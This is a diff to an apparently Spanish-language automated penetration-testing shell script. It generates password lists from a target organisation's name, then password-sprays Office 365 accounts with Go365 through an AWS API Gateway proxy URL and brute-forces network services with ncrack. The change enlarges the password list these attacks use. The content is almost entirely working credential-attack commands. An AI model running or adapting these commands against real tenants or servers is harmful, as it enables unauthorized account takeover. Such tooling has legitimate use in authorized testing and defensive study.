@@ -123,7 +123,7 @@ if [ -z $DICTIONARY ] ; then
 		echo "Generando diccionario"
 		echo $ENTIDAD > base.txt
 		passGen.sh -f base.txt -t online -o online.txt
-		passGen.sh -f base.txt -t top10 -o top10.txt
+		passGen.sh -f base.txt -t top10 -o passwords.txt
 		cat online.txt $PASSWORDS_FILE | sort | uniq >  passwords.txt		
 	else
 		echo "PASSWORDS_FILE $PASSWORDS_FILE"
@@ -277,7 +277,7 @@ then
 	done < .enumeracion2/"$DOMAIN"_office365_users.txt
 
 	Go365 -endpoint rst -up correo_password.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
-	Go365 -endpoint rst -ul .enumeracion2/"$DOMAIN"_office365_users.txt -pl top10.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
+	Go365 -endpoint rst -ul .enumeracion2/"$DOMAIN"_office365_users.txt -pl passwords.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	grep 'valid login' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
 		
 fi
@@ -935,7 +935,7 @@ if [[ "$MODE" == "total" ]] ; then
 				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 				script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 							
 				if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 										
-					ncrack --user "$admin_user" -P top10.txt -g cd=8 $ip:$port | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+					ncrack --user "$admin_user" -P passwords.txt -g cd=8 $ip:$port | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 					echo ""				
 					break
 				else								
